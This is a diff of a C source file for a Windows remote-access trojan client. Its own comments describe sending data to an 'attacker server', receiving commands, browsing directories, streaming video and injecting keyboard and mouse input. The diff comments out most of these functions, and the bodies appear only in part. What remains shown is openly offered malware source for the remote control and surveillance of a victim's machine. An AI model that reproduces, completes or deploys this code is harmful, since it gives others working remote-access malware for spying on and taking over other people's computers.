@@ -52,7 +52,7 @@
 #define KEY_UP 25 /* same as KEY_DOWN */
 #define START_INPUT 26 /* tell the C client to simulate inputs from a list of all input events since last frame */
 #define CONT_INPUT 27 /* tell the C client there's more input - ends with null terminator */
-
+/*
 // define useful globals
 char currDir[MAX_PATH]; // name of the current directory
 SOCKET mainSock; // main socket used to receive commands and send info
@@ -67,7 +67,7 @@ int keyboardControl = 0; // flag for if keyboard is being controlled
 DWORD WINAPI test(void* data);
 void connectToVideo();
 void connectToInput();
-
+*/
 // helper function for exiting on error
 void exitOnError() {
 	printf("Exiting program...\n");
@@ -78,6 +78,7 @@ void exitOnError() {
 // "code" is the #DEFINE associated with the data being sent
 // assumes that the string passed has a null-terminator
 // TODO - won't always correctly send non-string data
+/*
 void sendData(char code, char* data) {
 	printf("Sending data to attacker server...\n");
 	// init local vars
@@ -108,11 +109,13 @@ void sendData(char code, char* data) {
 	printf("%s\n", buff);
 	free(buff);
 }
+*/
 
 /*
 * Change the current directory - used for directory traversal
 * All file and directory related commands will use the current directory as the default location
 */
+/*
 void changeDirectory(char* dirName) {
 	int newLen = strnlen(dirName, 4096);
 	int currLen = strnlen(currDir, MAX_PATH);
@@ -143,11 +146,13 @@ void changeDirectory(char* dirName) {
 		sendData(PRINT_INFO, "Directory does not exist!\n\0");
 	}
 }
+*/
 
 /*
 * List the contents of the current directory
 * TODO - handle optional argument for directory to list contents of
 */
+/*
 void listDirectoryContents() {
 	HANDLE findHandle;
 	WIN32_FIND_DATAA fileData;
@@ -179,6 +184,7 @@ void listDirectoryContents() {
 	// close the handle and return
 	FindClose(findHandle);
 }
+*/
 
 /*
 * Helper function to check if KEYEVENTF_EXTENDEDKEY needs to be set for a given virtual-key code 
@@ -191,6 +197,7 @@ void listDirectoryContents() {
 * the BREAK (CTRL+PAUSE) key; the PRINT SCRN key; and the divide (/) and 
 * ENTER keys in the numeric keypad. The extended-key flag is set if the key is an extended key.
 */
+/*
 DWORD isExtendedKey (WORD code) {
 	switch(code)
 	{
@@ -212,11 +219,13 @@ DWORD isExtendedKey (WORD code) {
 			return 0;
 	}
 }
+*/
 
 /*
 * Process input stream sent from command server
 * Send inputs to OS if keyboard and/or mouse control is enabled
 */
+/*
 void processInputStream(char* buffer) {
 	// locals used for processing stuff
 	int idx = 0;
@@ -323,25 +332,13 @@ void processInputStream(char* buffer) {
 		}
 		//printf("Buffer[%d] = %d\n", idx, buffer[idx]);
 	} while(buffer[idx] == CONT_INPUT && prev != idx);
-	// DEBUG
-	/*
-	if (prev == idx) {
-		printf("Broke out of infinite loop!\n");
-	}
-	printf("Processed buffer + 10:");
-	for (int i=0; i<idx + 10; i++) {
-		printf(" %x", (unsigned char)buffer[i]);
-		if (i == idx) {
-			printf(" |");
-		}
-	}
-	printf("\n");
-	*/
 }
+*/
 
 /*
 * Get buffer for input control
 */
+/*
 DWORD WINAPI inputLoop(void* data) {
 	// local vars
 	char buffer[4096];
@@ -370,11 +367,12 @@ DWORD WINAPI inputLoop(void* data) {
 	}
 	return 0;
 }
+*/
 
 /*
 * Handle commands from the attacker server
 * Return the #DEFINE associated with the command
-*/
+*//*
 char handleCommand(char* buffer) {
 	// get the command sent
 	char cmd = buffer[0];
@@ -496,12 +494,13 @@ char handleCommand(char* buffer) {
 	}
 	return cmd;
 }
-
+*/
 /*
 * Connect to the primary command server
 * This is where we'll get the commands to do stuff
 * Secondary connections will be set up for streaming other data
 */
+/*
 void connectToCommandServer() {
 	struct sockaddr_in server;
 	int retCode;
@@ -546,10 +545,11 @@ void connectToCommandServer() {
 
 	// TODO - kill the connection gracefully
 }
-
+*/
 /*
 * Connect to the video socket
 */
+/*
 void connectToVideo() {
 	struct sockaddr_in server;
 
@@ -574,10 +574,11 @@ void connectToVideo() {
 		printf("Connected to video server\n");
 	}
 }
-
+*/
 /*
 * Connect to the input stream
 */
+/*
 void connectToInput() {
 	struct sockaddr_in server;
 	printf("Connecting to input server\n");
@@ -603,6 +604,7 @@ void connectToInput() {
 		printf("Connected to input server\n");
 	}
 }
+*/
 
 // TODO - remove once done using
 int frames = 0;
@@ -770,6 +772,7 @@ DWORD WINAPI test(void* data) {
 	}
 }
 
+/*
 int main(int argc, char* argv[]) {
 	WSADATA wsa;
 	// initialize winsock
@@ -779,16 +782,17 @@ int main(int argc, char* argv[]) {
 		exitOnError();
 	}
 	// get the current directory
-	GetModuleFileNameA(NULL, currDir, MAX_PATH);
-	for (int i = MAX_PATH - 1; i >= 0; i--) {
-		if (currDir[i] == '\\' || currDir[i] == '/') {
-			currDir[i] = '\0';
-			break;
-		}
-		currDir[i] = '\0';
-	}
+	//GetModuleFileNameA(NULL, currDir, MAX_PATH);
+	//for (int i = MAX_PATH - 1; i >= 0; i--) {
+	//	if (currDir[i] == '\\' || currDir[i] == '/') {
+	//		currDir[i] = '\0';
+	//		break;
+	//	}
+	//	currDir[i] = '\0';
+	//}
 	printf("Running from \"%s\"\n", currDir);
 	// connect to the command server
 	connectToCommandServer();
 	return 0;
 }
+*/
